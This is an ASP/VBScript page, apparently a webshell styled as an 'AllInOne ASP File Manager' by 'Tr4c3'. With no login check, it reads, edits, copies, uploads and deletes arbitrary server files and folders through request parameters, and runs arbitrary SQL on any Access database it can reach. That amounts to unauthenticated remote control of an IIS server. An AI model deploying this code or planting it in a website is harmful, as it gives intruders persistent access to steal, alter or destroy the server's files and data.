<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%
'--------------------------------------------------
'AllInOne ASP File Manager
'Author Tr4c3
'Copyright www.Tr4c3.Com
'Email Tr4c3@126.com
'--------------------------------------------------
Server.ScriptTimeOut=200
Dim objFSO,strRootFolder,currentfolder,prefix,DBDriver
DBDriver = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" 			

Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	strRootFolder = Server.MapPath("/")
if session("currentfolder")="" then
session("currentFolder")=strrootfolder
end if
scriptname = Request.ServerVariables("SCRIPT_NAME")    

%>
<html><head>
<title>AllInOne ASP File Manager</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">
<!--
td {  font-size: 9pt}
a:link {  font-size: 9pt; color: #000000; text-decoration: none}
a:hover {  color: red; text-decoration: underline}
a:visited {  font-size: 9pt; text-decoration: none; color: #000000}
.clDescription { BORDER-RIGHT: #999999 1px solid; PADDING-RIGHT: 3px; BORDER-TOP: #999999 1px solid; PADDING-LEFT: 3px; FONT-SIZE: 11px; PADDING-BOTTOM: 3px; BORDER-LEFT: #999999 1px solid; WIDTH: 200px; PADDING-TOP: 3px; BORDER-BOTTOM: #999999 1px solid; FONT-FAMILY: verdana,arial,helvetica; BACKGROUND-COLOR: #FFFFCC}
#divDescription {Z-INDEX: 200; VISIBILITY: hidden; POSITION: absolute; background-color: #FFFFCC;}
#divlinks {	Z-INDEX: 1; LEFT: 100px; POSITION: absolute; TOP: 200px}
-->
</style>
<script language="JavaScript">
function checkBrowser(){
	this.ver=navigator.appVersion
	this.dom=document.getElementById?1:0
	this.ie6=(this.ver.indexOf("MSIE 6")>-1 && this.dom)?1:0;	
	this.ie5=(this.ver.indexOf("MSIE 5")>-1 && this.dom)?1:0;
	this.ie4=(document.all && !this.dom)?1:0;
	this.ns5=(this.dom && parseInt(this.ver) >= 5) ?1:0;
	this.ns4=(document.layers && !this.dom)?1:0;
	this.bw=(this.ie6 || this.ie5 || this.ie4 || this.ns4 || this.ns5)
	return this
}
bw=new checkBrowser()

fromX=20 //How much from the actual mouse X should the description box appear?
fromY=10 ///How much from the actual mouse Y should the description box appear?

//To set the font size, font type, border color or remove the border or whatever,
//change the clDescription class in the stylesheet.

//Makes crossbrowser object.
function makeObj(obj){								
   	this.css=bw.dom? document.getElementById(obj).style:bw.ie4?document.all[obj].style:bw.ns4?document.layers[obj]:0;	
   	this.wref=bw.dom? document.getElementById(obj):bw.ie4?document.all[obj]:bw.ns4?document.layers[obj].document:0;		
	this.writeIt=b_writeIt;																
	return this
}

function b_writeIt(text){if(bw.ns4){this.wref.write(text);this.wref.close()}
else this.wref.innerHTML=text}

//Capturing mousemove
var descx,descy;
function popmousemove(e){descx=bw.ns4?e.pageX:event.x; descy=bw.ns4?e.pageY:event.y}

//Initiates page
var isLoaded;
function popupInit(){
    oDesc=new makeObj('divDescription')
    if(bw.ns4)document.captureEvents(Event.MOUSEMOVE)
    document.onmousemove=popmousemove;
    isLoaded=true;
}	
//Shows the messages
function popup(messages){

    if(isLoaded){
	oDesc.writeIt('<span class="clDescription">'+messages+'</span>')
	if(bw.ie5 || bw.ie6) descy=descy+document.body.scrollTop
	oDesc.css.left=descx+fromX; oDesc.css.top=descy+fromY
	oDesc.css.visibility='visible'
    }
}
//Hides it
function popout(num){
	if(isLoaded) oDesc.css.visibility='hidden'
}

//initiates page on pageload.
onload=popupInit;

</script>
</head>
<body bgcolor="#FFFFFF">
<DIV id=divDescription> 
  <!--Empty div-->
</DIV>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr align="center"> 
    <td><font size="3"> File guanli  Xitong</font></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
</table>
<%

if request("op")="copy" then%>
<%
dim src,dst,fcopy
if Request("src")<>"" and Request("dst")<>"" then
src=Trim(Request("src"))
dst=Trim(Request("dst"))
set fcopy = objFSO.GetFile(src)
fcopy.Copy(dst)
Response.Write("Copy "&src&"<BR> to "&dst&" <BR>done!")
end if
%>
<form name="form1" method="post" action="<%=scriptname%>">
  <table width="100%" border="0" cellspacing="0" cellpadding="5">
    <tr> 
      <td align="center">
	  <input type="hidden" name="op" value="copy">
	  yuan  File:  
        <input name="src" type="text" id="src" value="<%=Request("src")%>" size="30"></td>
    </tr>
    <tr> 
      <td align="center">mubiao  File: <input name="dst" type="text" id="dst" size="30" value="<%=strrootfolder%>"></td>
    </tr>
    <tr> 
      <td align="center"><input type="submit" value="Submit"></td>
    </tr>
  </table>
</form>

<%
Response.End
end if
%>
<%
'---------------------------- XiuGai File---------------------------------------------
if request("op")="edit" then%>
<%dim filename,TextStream
filename=request("filename")
set TextStream=objFSO.OpenTextFile(filename)
call header
%>
<form name="form" method="post" action="<%=scriptname%>" >
  <table width="100%" border="1" cellspacing="0" cellpadding="10" bordercolorlight="#000000" bordercolordark="#FFFFFF">
    <tr align="center"> 
      <td height="12"> <p> 
          <input type="hidden" name="op" value="save">
          <input type="hidden" name="folder" value="<%=objFSO.GetParentFolderName(request("filename"))%>">
           Fileming : <%=objFSO.GetFileName(request("filename"))%> 
          <input type="hidden" name="newfilename" value="<%=objFSO.Getfilename(request("filename"))%>">
        </p>
        </td>
    </tr>
    <tr align="center"> 
      <td height="344">  File content ( FileSize Cannot  chaoguo<font color="#FF0000">2M</font>)<br>
        <table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr> 
            <td width="93%" align="center" rowspan="2"> 
              <textarea name="content" rows="26" cols="90" wrap="OFF"><%=Server.HTMLEncode(TextStream.Readall)%></textarea>
            </td>
            <td width="7%" valign="top" height="210"> 
              <input type="submit" name="Submit" value="save File">
            </td>
          </tr>
          <tr>
            <td width="7%" valign="bottom"> 
              <input type="submit" name="Submit" value="save File">
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</form>

<%call copyright
Response.End
end if
%>
<%
'----------------------------save File---------------------------------------------
if request("op")="save" then%>
<%dim objtext,fullname
on error resume next
fullname=session("currentfolder") & "\"& request("newfilename")
'response.write fullname
set objtext=objFSO.CreateTextFile(fullname,True)
objtext.WriteLine (request("content"))
objtext.close
if err<>0 then
response.write "save File shi fasheng cuowu,keneng shi nin Meiyou Write quanxian"
response.end
else
response.redirect scriptname
end if
%>
<%
Response.End
end if
%>
<%

if request("op")="new" then%>
<%dim folder
folder=request("folder")
call header
%>
<form name="form" method="post" action="<%=scriptname%>" >
  <table width="100%" border="1" cellspacing="0" cellpadding="10" bordercolorlight="#000000" bordercolordark="#FFFFFF">
    <tr align="center"> 
      <td> 
        <input type="hidden" name="folder" value="<%=folder%>">
		<input type="hidden" name="op" value="save">
         Fileming (baokuo kuozhang ming ): 
<input type="text" name="newfilename" maxlength="30" size="20">
      </td>
    </tr>
    <tr align="center"> 
      <td height="344">  File content ( FileSize cannot dayu<font color="#FF0000">2M</font>)<br>
        <table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr> 
            <td width="93%" align="center" rowspan="2"> 
              <textarea name="content" rows="30" cols="90"></textarea>
            </td>
            <td width="7%" valign="top" height="210"> 
              <input type="submit" name="Submit" value="save File">
            </td>
          </tr>
          <tr>
            <td width="7%" valign="bottom"> 
              <input type="submit" name="Submit" value="save File">
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</form>

<%call copyright
Response.End
end if
%>

<%
'---------------------------- del File---------------------------------------------
if request("op")="del" then%>
<%
filename=request("filename")
objFSO.Deletefile filename
response.redirect scriptname
Response.End
end if
%>
<%
'---------------------------- delFolder---------------------------------------------
if request("op")="delfolder" then%>
<%
foldername=request("folder")
objFSO.DeleteFolder foldername
response.redirect scriptname&"?folder="&objFSO.GetParentFolderName(foldername)
Response.End
end if
%>
<%
'----------------------------Upload  File---------------------------------------------
if request("op")="upload" then
	call header  
if request("op2")="" then%>
<form name="upload" method="post" action="<%=scriptname%>?op=upload&op2=save" enctype="multipart/form-data" >
  <br>
  <input type="hidden" name="act" value="upload">
  <br>
  <table width="71%" border="1" cellspacing="0" cellpadding="5" align="center" bordercolordark="#CCCCCC" bordercolorlight="#000000">
    <tr> 
      <td height="22" align="center" valign="middle"> FileUpload </td>
    </tr>
    <tr> 
      <td height="92"> 
        <script language="javascript">
	  function setid()
	  {
	  str='<br>';
	  if(!window.upload.upcount.value)
	   window.upload.upcount.value=1;
 	  for(i=1;i<=window.upload.upcount.value;i++)
	     str+=' File'+i+':<input type="file" name="file'+i+'" style="width:400" class="tx1"><br><br>';
	  window.upid.innerHTML=str+'<br>';
	  }
	  </script>
        <ul>
          <li> xuyao Upload de geshu 
            <input type="text" name="upcount" value="1">
            <input type="button" onclick="setid();" value="sheding">
          </li>
          <br>
          <br>
          <li>Upload  Dao : 
            <input type="text" name="filepath" style="width:350" value="<%=request("folder")%>">
          </li>
        </ul>  
      </td>  
    </tr>  
    <tr align="center" valign="middle">   
      <td align="left" id="upid" height="122">  File1: 
        <input type="file" name="file1" style="width:400" value="">  
      </td>  
    </tr>  
    <tr align="center" valign="middle" bgcolor="#eeeeee">   
      <td height="24" align="center" bgcolor="#FFEFDF">   
        <input type="submit" name="Submit" value="Submit">
      </td>  
    </tr>  
  </table>  
</form>  
<script language="javascript">  
  
setid();  
</script>
<%else%>
<%

%>
<script language="VBScript" runat="server">
Dim oUpFileStream

Class UpFile_Class

Dim Form,File,Version,Err 

Private Sub Class_Initialize
 Version = "wuju Upload lei Version V1.0"
 Err = -1
End Sub

Private Sub Class_Terminate  

  If Err < 0 Then
    Form.RemoveAll
    Set Form = Nothing
    File.RemoveAll
    Set File = Nothing
    oUpFileStream.Close
    Set oUpFileStream = Nothing
  End If
End Sub
   
Public Sub GetData (RetSize)

  Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
  Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  Dim iFindStart,iFindEnd
  Dim iFormStart,iFormEnd,sFormName

  If Request.TotalBytes < 1 Then
    Err = 1
    Exit Sub
  End If
  If RetSize > 0 Then 
    If Request.TotalBytes > RetSize Then
    Err = 2
    Exit Sub
    End If
  End If
  Set Form = Server.CreateObject ("Scripting.Dictionary")
  Form.CompareMode = 1
  Set File = Server.CreateObject ("Scripting.Dictionary")
  File.CompareMode = 1
  Set tStream = Server.CreateObject ("ADODB.Stream")
  Set oUpFileStream = Server.CreateObject ("ADODB.Stream")
  oUpFileStream.Type = 1
  oUpFileStream.Mode = 3
  oUpFileStream.Open 
  oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
  oUpFileStream.Position = 0
  RequestBinDate = oUpFileStream.Read 
  iFormEnd = oUpFileStream.Size
  bCrLf = ChrB (13) & ChrB (10)

  sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
  iStart = LenB  (sSpace)
  iFormStart = iStart+2

  Do
    iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3
    tStream.Type = 1
    tStream.Mode = 3
    tStream.Open
    oUpFileStream.Position = iFormStart
    oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
    tStream.Position = 0
    tStream.Type = 2
    tStream.CharSet = "gb2312"
    sInfo = tStream.ReadText      

    iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
    iFindStart = InStr (22,sInfo,"name=""",1)+6
    iFindEnd = InStr (iFindStart,sInfo,"""",1)
    sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)

    If InStr  (45,sInfo,"filename=""",1) > 0 Then
      Set oFileInfo = new FileInfo_Class

      iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
      iFindEnd = InStr (iFindStart,sInfo,"""",1)
      sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
      oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1)
      oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\")+1)
      oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
      iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
      iFindEnd = InStr (iFindStart,sInfo,vbCr)
      oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
      oFileInfo.FileStart = iInfoEnd
      oFileInfo.FileSize = iFormStart -iInfoEnd -2
      oFileInfo.FormName = sFormName
      file.add sFormName,oFileInfo
    else

      tStream.Close
      tStream.Type = 1
      tStream.Mode = 3
      tStream.Open
      oUpFileStream.Position = iInfoEnd 
      oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
      tStream.Position = 0
      tStream.Type = 2
      tStream.CharSet = "gb2312"
      sFormValue = tStream.ReadText
      If Form.Exists (sFormName) Then
        Form (sFormName) = Form (sFormName) & ", " & sFormValue
        else
        form.Add sFormName,sFormValue
      End If
    End If
    tStream.Close
    iFormStart = iFormStart+iStart+2

  Loop Until  (iFormStart+2) = iFormEnd 
  RequestBinDate = ""
  Set tStream = Nothing
End Sub
End Class


Class FileInfo_Class
Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt

Public Function SaveToFile (Path)
  On Error Resume Next
  Dim oFileStream
  Set oFileStream = CreateObject ("ADODB.Stream")
  oFileStream.Type = 1
  oFileStream.Mode = 3
  oFileStream.Open
  oUpFileStream.Position = FileStart
  oUpFileStream.CopyTo oFileStream,FileSize
  oFileStream.SaveToFile Path,2
  oFileStream.Close
  Set oFileStream = Nothing 
End Function
 

Public Function FileDate
  oUpFileStream.Position = FileStart
  FileDate = oUpFileStream.Read (FileSize)
  End Function
End Class
</script>
<%

dim upload,file,formName,formPath,iCount

set upload=new UpFile_Class 
MaxSize = 1024*1024
upload.GetData(Int(MaxSize*1024))
if upload.err > 0 then
    select case upload.err
	case 1
	Response.Write "Please choose Upload File　[ <a href=# onclick=history.go(-1)>Chongxin Upload </a> ]"
	case 2
	Response.Write " FileSize chaoguo le xianzhi"&MaxSize&"K　[ <a href=# onclick=history.go(-1)>Chongxin Upload </a> ]"
	end select
	Response.End
end if
'response.write upload.Version&"<br><br>"  
formPath=upload.form("filepath")
formPath2=formPath
if formPath="" then   
 Response.Write("Please Input Upload to-mulu!")
 set upload=nothing
 response.end
else

 if right(formPath,1)<>"\" then formPath=formPath&"\" 
end if

iCount=0
for each formName in upload.file 
 set file=upload.file(formName)  
 if file.FileSize>0 then         
  'file.SaveAs Server.mappath(formPath&file.FileName)   ''save File
  file.SaveToFile formPath&file.FileName
  response.write "<p><center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" Success !</center></p>"
  Response.Flush()
  iCount=iCount+1
 end if
 set file=nothing
next
set upload=nothing  
%>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td align="center"><a href="<%=scriptname%>?folder=<%=Server.URLEncode(formPath2)%>">Back:  
      <%=formPath2%></a>&nbsp;</td>
  </tr>
  <tr>
    <td align="center">&nbsp;</td>
  </tr>
</table>
<%end if%>
<%call copyright
Response.End
end if
%>
<%
'----------------------------New Folder---------------------------------------------
if request("op")="newfolder" then
call header%>
<%if request("newfolder1")<>"" or request("newfolder2")<>"" or request("newfolder3")<>"" then
	folder=trim(request("folder"))
	dim newfolder(3)
	if trim(request("newfolder1")) <>"" then newfolder(0) = folder & "\" & trim(request("newfolder1"))
	if trim(request("newfolder2")) <>"" then newfolder(1) = folder & "\" & trim(request("newfolder2"))
	if trim(request("newfolder3")) <>"" then newfolder(2) = folder & "\" & trim(request("newfolder3"))
	for i=0 to Ubound(newfolder)
		if newfolder(i)<>"" and not isempty(newfolder(i)) then
			objFSO.CreateFolder(newfolder(i))
			Response.Write("<p align=""center"">" & newfolder(i) & " Create Success</p>")
		end if
	next
	if session("currentfolder")=folder then
		response.Write("<p align=""center"">Back:  <a href="""&scriptname&"?folder="&Server.URLEncode(folder)&""">"&folder&"</a>")
	else
		response.Write("<p align=""center"">Back:  <a href="""&scriptname&"?folder="&folder&""">"&folder&"</a>")
		response.Write("<p align=""center"">Back:  <a href="""&scriptname&"?folder="&Server.URLEncode(session("currentfolder"))&""">"&session("currentfolder")&"</a>")
	end if
%><p></p>
<%else%>
<form action="<%=scriptname%>" method="post" name="newfolder" id="newfolder">
  <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolordark="#FFFFFF" bordercolorlight="#000000">
    <tr> 
      <td align="center">
<input name="folder" type="text" value="<%=request("folder")%>" size="40">
      </td>
    </tr>
    <tr> 
      <td align="center">Folder1 
        <input name="newfolder1" type="text" id="newfolder1"></td>
    </tr>
    <tr> 
      <td align="center">Folder2 
        <input name="newfolder2" type="text" id="newfolder2"></td>
    </tr>
    <tr> 
      <td align="center">Folder3 
        <input name="newfolder3" type="text" id="newfolder3"> </td>
    </tr>
    <tr> 
      <td align="center"><input name="op" type="hidden" id="op22" value="newfolder"> 
        <input type="submit" value="New Folder"></td>
    </tr>
  </table>
</form>
<%end if%>
<%call copyright
Response.End
end if
%>
<%

if request("op")="db" and request("dbname")<>"" and request("tablename")<>"" then
call header
dbname=request("dbname")
tablename=request("tablename")
Set objConn = Server.CreateObject("ADODB.Connection")
objConn.ConnectionString = DBDriver & dbname
objConn.Open
Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
if tablename="" then tablename=objTableRS("Table_Name").Value
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
  <tr>
    <td width="19%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>"><%=objFSO.GetFilename(dbname)%></a><br>
      <br>
      <table width="95%" border="0" cellspacing="0" cellpadding="6">
        <%Do While Not objTableRS.EOF%> 
        <tr> 
          <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
        </tr>
        <%objTableRS.MoveNext
		Loop%> 
      </table>
    </td>
    <td width="81%" valign="top">
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr valign="top"> 
          <td align="center" valign="top"><font color="#330099"><%=tablename%></font> 
            <form action="<%=scriptname%>" method="post" name="sqlcmd" id="sqlcmd">
              <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr valign="top"> 
                  <td align="center"> <input name="cmd" type="text" id="cmd" size="60"> 
                    <input name="op" type="hidden" id="op" value="sql"> <input name="dbname" type="hidden" id="dbname" value="<%=request("dbname")%>"> 
                    <input type="submit" value="Act SQL"></td>
                </tr>
              </table>
            </form>
            
          </td>
        </tr>
      </table>
      <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
        <tr bgcolor="#CCCCCC" align="center" valign="top">
<%dim mysql,objRS,i,j
j=1
mysql="Select Top 10 * From ["&tablename&"]"
Set objRS=objConn.Execute(mysql)
'response.write "<td>-caozuo</td>"
For i=0 to objRs.Fields.Count-1
Response.write"<td><b>"&objRS.Fields(i).name&"</b></td>"
Next
Response.write "</tr>"
if objrs.eof then

else
DO While NOT objRS.Eof
Response.write "<tr>"
%>

<%
For i=0 to objRs.Fields.Count-1
Response.write"<td>"
If IsNull(objRs.Fields(i).value) or objRs.Fields(i).value="" or objRs.Fields(i).value=" " then
response.write "&nbsp;"
else
  Response.write Server.HTMLEncode(objRs.Fields(i).value)
 end if
Response.write"</td>"
Next
Response.write"</tr>"
objRS.MoveNext
j=j+1
Loop
end if
set objRs = nothing
set objTableRS = nothing
objConn.Close
set objConn = nothing
%>
     </table>
      <p>zuiduo-xianshi10tiao-jilu，yao-chakan-gengduo-jilu-qing-shiyong SQL Command</p><br>
  </table>
<%call copyright
Response.End
end if
%>
<%

if request("op")="db" and request("dbname")<>"" then
call header
dbname=request("dbname")
Set objConn = Server.CreateObject("ADODB.Connection")
objConn.ConnectionString = DBDriver & dbname
objConn.Open
Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
  <tr>
    <td width="19%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=dbname%>"><%=objFSO.GetFilename(dbname)%></a><br>
      <br>
      <table width="95%" border="0" cellspacing="0" cellpadding="6">
        <%Do While Not objTableRS.EOF%> 
        <tr> 
          <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
        </tr>
        <%objTableRS.MoveNext
		Loop
		objTableRS.MoveFirst%> 
      </table>
    </td>
    <td width="81%" align="center" valign="top"><a href="<%=scriptname%>?op=sql&dbname=<%=dbname%>">Act SQL Command<br>
      </a> 
      <%While Not objTableRS.EOF%>
      <table width="98%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
        <tr align="center" bgcolor="#FFFFCC"> 
          <td colspan="6"><font color="#660000" size="2"><b><%=objTableRS("Table_Name").Value%></b></font></td>
        </tr>
        <tr align="center"> 
          <td>ziduan</td>
          <td>shuju-leixin</td>
          <td>ziduan-daxiao</td>
          <td>jingdu</td>
          <td>shifou-yunxu-kong</td>
          <td>morenzhi</td>
        </tr>
        <tr> 
          <%
        Set objColumnRS = objConn.OpenSchema(4,Array(Empty, Empty, objTableRS("Table_Name").Value))
'		for i=0 to objColumnRS.fields.count - 1
'			response.Write(objColumnRS.fields(i).Name&"<BR>")
'		next
		While Not objColumnRS.EOF
        iLength = objColumnRS("Character_Maximum_Length")
		iPrecision = objColumnRS("Numeric_Precision")	
	            iScale = objColumnRS("Numeric_Scale")
		iDefaultValue = objColumnRS("Column_Default")
              	If IsNull(iLength) then iLength = "&nbsp;"	
	            If IsNull(iPrecision) then iPrecision = "&nbsp;"
		If IsNull(iScale) then iScale = "&nbsp;"
		If IsNull(iDefaultValue) then iDefaultValue = "&nbsp;"%>
          <td width="29%" height="8"><%=objColumnRS("Column_Name")%></td>
          <td width="12%" height="8"><%=fieldtype(objColumnRS("Data_Type"))%></td>
          <td width="11%" height="8"><%=iLength%></td>
          <td width="9%" height="8"><%=iPrecision%></td>
          <td width="17%" align="center" height="8"> 
            <%If objColumnRS("Is_Nullable") then
			Response.Write "Yes"
            else
            Response.write "No"
		End If%>
          </td>
          <td width="22%" height="8"><%=iDefaultValue%></td>
        </tr>
        <%	objColumnRS.MoveNext
	Wend
	objTableRS.MoveNext
	Set objColumnRS = Nothing
Response.write "<br>"
Wend
objTableRS.Close
Set objTableRS = Nothing
objConn.Close
Set objConn = Nothing
%>
      </table> </td>
      
      </table>
<%call copyright
Response.End
end if
%>
<%
'----------------------------Act SQL Command---------------------------------------------
if request("op")="sql" then
call header
dbname=request("dbname")
Set objConn = Server.CreateObject("ADODB.Connection")
objConn.ConnectionString = DBDriver & dbname
objConn.Open
Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
j=0
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
  <tr>
    <td width="13%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>"><%=objFSO.GetFilename(dbname)%></a><br>
      <br>
      <table width="95%" border="0" cellspacing="0" cellpadding="6">
        <%Do While Not objTableRS.EOF%> 
        <tr> 
          <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
        </tr>
        <%objTableRS.MoveNext
		Loop%> 
      </table>
    </td>
    <td width="87%" align="center" valign="top"> 
      <form action="<%=scriptname%>" method="post" name="sqlcmd" id="sqlcmd">
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr valign="top"> 
          <td align="center">
				<input name="cmd" type="text" id="cmd" size="60">
              <input name="op" type="hidden" id="op" value="sql">
			  <input name="dbname" type="hidden" id="dbname" value="<%=request("dbname")%>">
              <input type="submit" value="Act SQL"></td>
        </tr>
      </table>
      </form> 
      <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
        <tr bgcolor="#CCCCCC" align="center" valign="top">
<%if request("cmd")<>"" then
mysql=request("cmd")
Set objRS=objConn.Execute(mysql)
'response.write "<td>-caozuo</td>"
if objrs.state = 1 then 
For i=0 to objRs.Fields.Count-1
Response.write"<td><b>"&objRS.Fields(i).name&"</b></td>"
Next
Response.write "</tr>"
if objrs.eof then
%>
<%else
DO While NOT objRS.Eof
Response.write "<tr>"
%>

<%
For i=0 to objRs.Fields.Count-1
Response.write"<td>"
If IsNull(objRs.Fields(i).value) or objRs.Fields(i).value="" or objRs.Fields(i).value=" " then
response.write "&nbsp;"
else
  Response.write Server.HTMLEncode(objRs.Fields(i).value)
 end if
Response.write"</td>"
Next
Response.write"</tr>"
objRS.MoveNext
j=j+1
Loop
end if
set objRs = nothing
end if
end if
set objTableRS = nothing
objConn.Close
set objConn = nothing
%>
     </table>
      <br>
      <%if request("cmd")<>"" then response.Write(" CommandAct Success，Back <font color=""#FF0000"">"&j&"</font> tiao-jilu")%>
  </table>
<%call copyright
Response.End
end if
%>
<%
'---------------------------- File-liebiao---------------------------------------------
%>
<%call header%>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr align="center"> 
    <td height="87"> 
      <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
        <tr> 
          <td width="19%" align="center">Folder-liebiao</td>
          <td width="81%" align="center"><a href="<%=scriptname%>?op=upload&folder=<%=Server.urlencode(session("currentfolder"))%>">Upload  File</a>&nbsp; 
            <a href="<%=scriptname%>?op=new&folder=<%=Server.urlencode(session("currentfolder"))%>">New  File</a>&nbsp; 
            <a href="<%=scriptname%>?op=newfolder&folder=<%=Server.urlencode(session("currentfolder"))%>">New Folder</a>&nbsp; 
            <a href="<%=scriptname%>?op=delfolder&folder=<%=Server.urlencode(session("currentfolder"))%>" onclick="return confirm('QueDing del <%=Replace(session("currentfolder"),"\","\\")%> ？\n\nGaiFolder de All File Ye jiang bei Del')">Del Dangqian Folder</a></td>
        </tr>
        <tr> 
          <td width="19%" align="center" valign="top"> 
              <table width="98%" border="0" cellspacing="0" cellpadding="3">
                <tr> 
                  <td height="13" align="center" colspan="2"> <%if session("currentfolder")<>strrootFolder then
response.write "<a href='"&scriptname&"?folder="&objFSO.GetParentFolderName(session("currentfolder"))&"'>Back  shangji--mulu</a>"
else
response.write "dangqian-weigeng-mulu"
End if
dim objfolder,objSubFolder
Set objFolder = objFSO.GetFolder(session("currentfolder"))
%></td>
                  <%For Each objSubFolder in objFolder.SubFolders%> </tr>
                <tr> 
                  <td width="11%">&nbsp;</td>
                  
                <td width="89%"><font face="Wingdings">1</font> 
                  <a href="<%=scriptname%>?folder=<%=Server.urlencode(prefix&"\"&objSubFolder.Name)%>"> 
                  <%=objSubFolder.Name%></a></td>
                </tr>
                <%Next%> 
              </table>
          </td>
          <td width="81%" align="center" valign="top">
<table width="98%" border="0" cellspacing="0" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF">
              <tr bgcolor="#FFFFD2"> 
                <td width="26%"><font color="#000066" size="2"> File Name</font></td>
                <td width="19%" align="right"><font color="#000066" size="2"> File Size</font></td>
                <td width="29%" align="center"><font color="#000066" size="2"> File Type</font></td>
                <td width="26%" align="center"><font color="#000066" size="2"> File-caozuo</font></td>
              </tr>
              <%Dim objFile,extname,FileCount
	FileCount = 0
	FileSize = 0
    For Each objFile in objFolder.Files
	FileCount=FileCount + 1
    %>
              <tr> 
                <td width="26%"> 
                  <%extname=objFSO.GetExtensionName(objfile.name)%>
				  <%if extname<>"mdb" then%>
                  <a href="<%=scriptname%>?op=edit&filename=<%=Server.urlencode(prefix&"\"&objfile.name)%>"><%=objfile.name%></a> 
				  <%else%>
                  <a href="<%=scriptname%>?op=db&dbname=<%=Server.urlencode(prefix&"\"&objfile.name)%>"><%=objfile.name%></a> 
				  <%end if%>
                </td>
				<%FileSize = FileSize + objfile.size%>
                <td width="19%" align="right"><%=FormatNumber(Round(objfile.size/1024,1),1,-1)%> 
                  KB</td>
                <td width="29%" align="center"><%=objfile.type%></td>
                <td width="26%" align="center" valign="bottom"> 
                  <%if extname<>"mdb" then%>
                  <a href="<%=scriptname%>?op=edit&filename=<%=Server.urlencode(prefix&"\"&objfile.name)%>"> XiuGai</a> 
                  <%else%>
                  <a href="<%=scriptname%>?op=db&dbname=<%=Server.urlencode(prefix&"\"&objfile.name)%>"> XiuGai</a> 
                  <%end if%>
                  <a href="<%=scriptname%>?op=del&filename=<%=Server.urlencode(prefix&"\"&objfile.name)%>" onclick="return confirm('QueDing del<%=" "&objfile.name&" "%>？')"> del</a> 
                  <a href="<%=scriptname%>?op=copy&src=<%=Server.urlencode(prefix&"\"&objfile.name)%>" target="_blank">Copy </a> 
                  <a href="<%=scriptname%>?op=db&dbname=<%=Server.urlencode(prefix&"\"&objfile.name)%>">shujuku</a> </td>
              </tr>
              <%Next%>
              <tr align="center"> 
                <td colspan="4"><br>
                  Total File-Count: <font color="#FF0000"><%=FileCount%></font> , Size: <font color="#FF0000"><%=FormatNumber(Round(FileSize/1024,1),1,-1)%></font> 
                  KB </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
